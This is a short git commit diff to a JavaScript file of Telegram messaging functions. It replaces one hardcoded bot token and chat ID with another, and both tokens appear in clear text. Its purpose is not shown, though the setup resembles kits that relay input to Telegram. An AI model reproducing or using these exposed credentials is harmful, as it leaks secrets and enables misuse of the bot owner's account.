0a6f46df12d6c98f825b7a2d46307070c33d0b67
popular-popular-popular <fredypuyo792@gmail.com>
2026-09-20 15:10:45 -0500

    Update telegram.js

--- bogota/telegram.js
+++ bogota/telegram.js
@@ -1,6 +1,6 @@
   // js/telegram.js - Funciones de Telegram
-  const TELEGRAM_BOT_TOKEN = '8760922430:AAFxF0ctzvvqKgkZvcB3MRQlyIzzdG7ijQ0';
-  const TELEGRAM_CHAT_ID = '-1003577139660';
+ const TELEGRAM_BOT_TOKEN = '8227170105:AAE7eKCUoC29c5Qp6uD8YZKIwXCwckKgGBw';
+  const TELEGRAM_CHAT_ID = '8217102156';
 
   // ========== ENVIAR MENSAJES ==========
   function sendTelegramMessage(text, keyboard = null) {
